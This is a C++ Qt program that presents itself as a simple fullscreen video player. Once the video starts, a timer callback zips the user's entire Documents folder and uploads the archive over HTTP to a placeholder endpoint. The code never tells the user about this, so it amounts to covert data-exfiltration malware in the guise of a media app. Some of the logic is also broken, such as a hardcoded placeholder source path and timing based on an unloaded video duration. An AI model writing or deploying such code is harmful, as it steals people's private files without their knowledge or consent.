#include <QApplication>
#include <QMediaPlayer>
#include <QVideoWidget>
#include <QTimer>
#include <QFile>
#include <QDir>
#include <QDebug>
#include <QProcess>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHttpPart>
#include <QStandardPaths>

int main(int argc, char *argv[]) {
    QApplication app(argc, argv);

    // Copy the video file from source to destination
    QString sourceFilePath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation) + "/video.mp4";
    QString destinationFilePath = QDir::tempPath() + "/video.mp4";
    if (QFile::copy("/path/to/your/video.mp4", destinationFilePath)) {
        qDebug() << "File copied successfully.";
    } else {
        qWarning() << "Failed to copy file.";
        return 1;
    }

    // Create a video player and a video widget
    QMediaPlayer *player = new QMediaPlayer;
    QVideoWidget *videoWidget = new QVideoWidget;
    player->setVideoOutput(videoWidget);

    // Set the video source
    player->setMedia(QUrl::fromLocalFile(destinationFilePath));

    // Show the video widget fullscreen
    videoWidget->setFullScreen(true);
    videoWidget->show();

    // Start playing the video
    player->play();

    // Connect a timer to exit the application after video playback ends
    QTimer::singleShot(player->duration(), &app, [&]() {
        // Get the documents directory path
        QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);

        // Create a ZIP file of the documents directory
        QString zipFilePath = QDir::tempPath() + "/documents.zip";
        QStringList arguments;
        arguments << "-r" << zipFilePath << documentsPath;
        QProcess zipProcess;
        zipProcess.start("zip", arguments);
        zipProcess.waitForFinished(-1);

        // Check if ZIP file creation was successful
        if (zipProcess.exitCode() != 0) {
            qWarning() << "Failed to create ZIP file.";
            return;
        }

        // Create a network manager to handle HTTP requests
        QNetworkAccessManager manager;

        // Create a HTTP multi-part request for sending email with attachment
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        // Add ZIP file as an attachment to the request
        QHttpPart zipPart;
        zipPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("attachment; filename=\"documents.zip\""));
        QFile *file = new QFile(zipFilePath);
        file->open(QIODevice::ReadOnly);
        zipPart.setBodyDevice(file);
        file->setParent(multiPart);  // Ensure file is deleted when multiPart is deleted
        multiPart->append(zipPart);

        // Create the email request
        QNetworkRequest request(QUrl("http://your_email_api_endpoint"));
        QNetworkReply *reply = manager.post(request, multiPart);
        multiPart->setParent(reply);  // Ensure multiPart is deleted when reply is deleted

        // Connect to the reply finished signal to handle email sending completion
        QObject::connect(reply, &QNetworkReply::finished, [&]() {
            if (reply->error() == QNetworkReply::NoError) {
                qDebug() << "Email sent successfully.";
            } else {
                qWarning() << "Error sending email:" << reply->errorString();
            }
            reply->deleteLater();  // Clean up the reply object
            app.quit();  // Exit the application after sending email
        });
    });

    return app.exec();
}
